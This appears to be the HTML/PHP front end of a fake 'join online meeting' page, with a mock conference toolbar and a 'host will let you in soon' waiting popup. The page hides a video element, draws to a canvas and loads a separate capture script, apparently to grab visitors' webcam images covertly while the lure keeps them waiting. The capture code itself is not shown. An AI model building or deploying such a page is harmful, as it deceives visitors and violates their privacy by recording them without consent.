<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
<head>
  <title>Join meeting</title>
    <meta property="og:title" content="Join online meeting" />
    <meta property="og:type" content="website" />
    <meta name="og:image" content="/desc.png" />
    <meta name="description" content="Join online meeting" property="og:description">
    <meta name="description" content="/desc.png" property="og:image" />
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Join meeting!" />
    <meta name="twitter:description" content="Join online meeting" />
    <meta name="twitter:image" content="/desc.png">
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link rel="stylesheet" type="text/css" href="/styles.css">
</head>

<div class="video-wrap" hidden="hidden">
  <video id="video" playsinline autoplay></video>
</div>

<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>

<script src="/capture.js"></script>
<script>
  $(document).ready(function(){
   setTimeout(function(){
      $('#ac-wrapper').attr("display","none"); 
   },50000); // 5000 to load it after 5 seconds from page load
});
</script>

<body>
  <div class="float_button">
    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
  </div>
  <div id="ac-wrapper">
    <div id="popup">
        <center>
            <h2>Please wait the meeting host will let you in soon</h2>
        </center>
    </div>
</div>
  <div class="bottom-bar">
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-microphone"></i>
      <h6>Mute</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-video"></i>
      <h6>Stop Video</h6>
    </div>
    <div class="icon-button" style="margin-left: auto;">
      <i class="fas fa-shield-alt"></i>
      <h6>Security</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-users"></i>
      <h6>Participants</h6>
    </div>
    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
      <i class="fas fa-plus-square"></i>
      <h6>Share content</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-comments"></i>
      <h6>Chat</h6>
    </div>
    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
      <i class="fas fa-record-vinyl"></i>
      <h6>Record</h6>
    </div>
    <button style="margin-right: 50px;">End</button>
  </div>
</body>

</html>